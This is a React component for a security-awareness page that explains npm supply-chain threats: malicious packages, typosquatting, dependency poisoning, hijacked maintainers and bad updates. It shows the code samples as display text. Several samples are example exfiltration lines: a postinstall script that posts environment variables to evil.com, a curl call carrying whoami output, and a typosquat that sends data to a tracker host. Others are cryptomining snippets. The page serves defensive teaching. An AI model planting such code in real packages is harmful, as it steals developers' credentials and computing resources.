import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { AlertTriangle, GitFork, FileText, UserX, Package } from "lucide-react";

const SupplyChainInfo = () => {
  const navigate = useNavigate();

  const threats = [
    {
      icon: AlertTriangle,
      title: "Intentionally Malicious Packages",
      description: "Packages deliberately created to steal data or compromise systems.",
      example: "A package that exfiltrates environment variables containing API keys and credentials to a remote server.",
      color: "text-destructive",
      code: `// postinstall.js
const https = require('https');

// Collect environment variables
const data = JSON.stringify({
  env: process.env,
  cwd: process.cwd()
});

// Send to attacker's server
https.request('https://evil.com/collect', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
}).write(data);`
    },
    {
      icon: FileText,
      title: "Typosquatting",
      description: "Malicious packages with names similar to popular legitimate packages.",
      example: "Publishing 'reaqct' or 'lodas' to trick developers into installing the wrong package.",
      color: "text-orange-500",
      code: `// Package: "reaqct" (looks like "react")
// index.js
module.exports = {
  useState: function() {
    // Sends usage data to attacker
    fetch('https://tracker.evil.com/log', {
      method: 'POST',
      body: JSON.stringify(arguments)
    });
    return [null, () => {}];
  }
};`
    },
    {
      icon: GitFork,
      title: "Dependency Poisoning",
      description: "Injecting malicious code into legitimate package dependencies.",
      example: "A trusted package's dependency gets compromised, affecting all projects using it.",
      color: "text-yellow-600",
      code: `// Previously safe utility package
// Now compromised in v2.0.1
module.exports = {
  format: function(str) {
    // Original functionality
    const result = str.trim();
    
    // Added by attacker
    require('child_process')
      .exec('curl https://evil.com/$(whoami)');
    
    return result;
  }
};`
    },
    {
      icon: UserX,
      title: "Compromised Maintainer Accounts",
      description: "Attackers gain access to legitimate maintainer accounts to push malicious updates.",
      example: "A maintainer's npm account is hijacked, and malicious code is pushed as a trusted update.",
      color: "text-red-500",
      code: `// Added to popular package's v3.2.1 by attacker
// index.js (new code inserted)
if (process.env.NODE_ENV === 'production') {
  const crypto = require('crypto');
  setInterval(() => {
    // Mining cryptocurrency
    const hash = crypto.createHash('sha256')
      .update(Date.now().toString())
      .digest('hex');
  }, 100);
}`
    },
    {
      icon: Package,
      title: "Malicious Package Updates",
      description: "Previously safe packages that introduce malicious code in later versions.",
      example: "A popular package introduces cryptocurrency mining code in version 2.0.0.",
      color: "text-purple-500",
      code: `// Version 1.x was clean
// Version 2.0.0 adds:
const WebSocket = require('ws');

function init() {
  const ws = new WebSocket('wss://mining-pool.com');
  ws.on('message', (task) => {
    // Perform mining calculations
    const result = heavyComputation(task);
    ws.send(result);
  });
}
init();`
    }
  ];

  return (
    <div className="min-h-screen bg-gradient-to-br from-background via-background to-accent/20 flex flex-col items-center justify-center p-4">
      <div className="w-full max-w-6xl space-y-8 animate-fade-in">
        <div className="text-center space-y-4">
          <h1 className="text-4xl md:text-5xl font-bold bg-gradient-to-r from-primary via-primary/80 to-primary/60 bg-clip-text text-transparent">
            Common npm Supply Chain Threats
          </h1>
          <p className="text-lg text-muted-foreground max-w-2xl mx-auto">
            Understanding these attack vectors will help you identify malicious code in the wild.
          </p>
        </div>

        <div className="space-y-6 w-full">
          {threats.map((threat, index) => {
            const Icon = threat.icon;
            return (
              <Card key={index} className="hover:shadow-lg transition-shadow duration-300 border-border/50">
                <CardHeader>
                  <div className="flex items-start gap-3">
                    <Icon className={`w-6 h-6 ${threat.color} mt-1 flex-shrink-0`} />
                    <div className="space-y-1 flex-1">
                      <CardTitle className="text-xl">{threat.title}</CardTitle>
                      <CardDescription className="text-sm">
                        {threat.description}
                      </CardDescription>
                    </div>
                  </div>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="bg-muted/50 rounded-lg p-4 border border-border/30">
                    <p className="text-sm text-muted-foreground italic">
                      <span className="font-semibold text-foreground">Example:</span> {threat.example}
                    </p>
                  </div>
                  <div className="bg-black/80 rounded-lg p-4 border border-border/30 overflow-x-auto">
                    <pre className="text-xs text-green-400 font-mono">
                      <code>{threat.code}</code>
                    </pre>
                  </div>
                </CardContent>
              </Card>
            );
          })}
        </div>

        <div className="flex justify-center pt-6">
          <Button 
            size="lg" 
            onClick={() => navigate("/setup")}
            className="min-w-[200px]"
          >
            Continue to Setup
          </Button>
        </div>
      </div>
    </div>
  );
};

export default SupplyChainInfo;
